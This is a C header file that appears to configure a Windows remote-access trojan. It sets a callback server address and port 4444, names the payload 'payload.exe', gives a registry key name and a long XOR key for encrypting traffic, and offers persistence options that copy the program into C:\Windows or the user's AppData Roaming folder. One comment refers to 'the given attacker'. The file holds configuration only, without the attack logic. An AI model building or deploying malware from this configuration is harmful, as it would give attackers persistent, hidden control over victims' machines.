
#ifndef COMMON_H
#define COMMON_H

#define BUFFER_LEN 4096

//Change everything according to your wishes:
#define IP_ADDRESS "12344" //Ip of server
#define PORT 4444 //Port of server
#define AUTO_PERSISTENCE false
#define TIMEOUT 20000 // Seconds for reconnect to server during a disconnection
#define NAME_PROG L"payload.exe" //Name of prog
#define NAME_KEY_REGISTER  "win64" 
#define XOR_KEY "4d01ae07dbcf03d52e8efec7717ca1cc70e3c5c50af48f1625d6ef1f745e39f444bc70f78fa55a6606c7f8b0f4cdad6995990e294ec0740baba419ba8d04f75f052f7bcb1ab7da5043a7e554ed6bdfa71657569fc1c4084f6c0bdfb8656ad9763ae55ee130e7b93b3aad063380a650734a0ae28a5fdb3508a4c56d902a5c72c26fd17caa0c3d6056f204bfacc44587c09fdc686e33442f8bd2d3103ef8d96180da36dbc24d03507fbfa659023f3af8a885cf36ff64e63a02bebb837fae2b4fceed460f568aa2d56e3f046ed599784d119ca4fda90773e8b82987108503e5c6dcb9d104c19288bcf3298892bd12a0b04357e2d75be39f5ceb3da2fcd23ab49eeb73c99456ec815e0a7f728672746089dd969db224976137e8c98964c13dadf7d52f3ea177b120fe0386718ece3213a61a3798c24c968dd149f094f2c255c12ff418798c8d180769cfd4ed6035f1b1a86cb7adebb6300e96f7832c26dbbda6d5ec7ae9c1ee66d33dd4643ce1faa7b1a9f232c7c0892a44bad9bc987e2e505fa4a8a3627902bbb666c0cbb08532b9a6846d1ea8ed0e8c55bb1483ef16ac52eeb15a265e8a1a5e2cbbca32d611fd70f65fb7370cbe86477387fc52824f82636ffc3681c630a3685161a81636d154631d75f40347d1a862bce5d0b7cb6793260155ac1c443ffb2243e33cf68559e682dde554396ac59c6a44ca1ca6d1513f6fa7725d" //The key to encrypt and decrypt data using the XOR algorithm

#define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
#define PATH_ADMIN "C:\\Windows" //Persistence path if the client is running admin mode.
#define PATH_NOT_ADMIN "C:\\Users\\$USER\\AppData\\Roaming" // DO NOT TOUCH


// DO NOT TOUCH:
#define TIMEOUT_CREATE_PROC 10000
#define BUFFER_EXEC 1024 //Buffer for exec
#define BUFFER_LEN 4096
#define TIMEOUT_SOCK 5 
#define TIMEOUT_SOCK_RECONNECT 2000// timeout between each connection
#define SLEEP_RECV 200
#define MICRO_SLEEP 100 //micro sleep for timeout
#define SPLIT "|SPLIT|" 


#endif

